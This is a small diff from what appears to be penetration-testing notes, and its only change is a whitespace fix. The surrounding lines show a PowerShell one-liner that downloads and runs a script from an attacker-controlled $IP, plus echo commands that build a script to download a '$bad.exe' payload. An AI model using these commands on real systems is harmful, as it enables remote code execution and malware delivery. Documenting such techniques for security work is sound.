@@ -45,7 +45,7 @@ powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://$IP:
 echo $storageDir = $pwd > wget.ps1   
 echo $webclient = New-Object System.Net.WebClient >> wget.ps1   
 echo $url = "http://$IP:$PORT/$bad.exe" >> wget.ps1   
-echo $file = "$bad.exe" >>wget.ps1   
+echo $file = "$bad.exe" >> wget.ps1   
 echo $webclient.DownloadFile($url,$file) >> wget.ps1
 ```
 Then
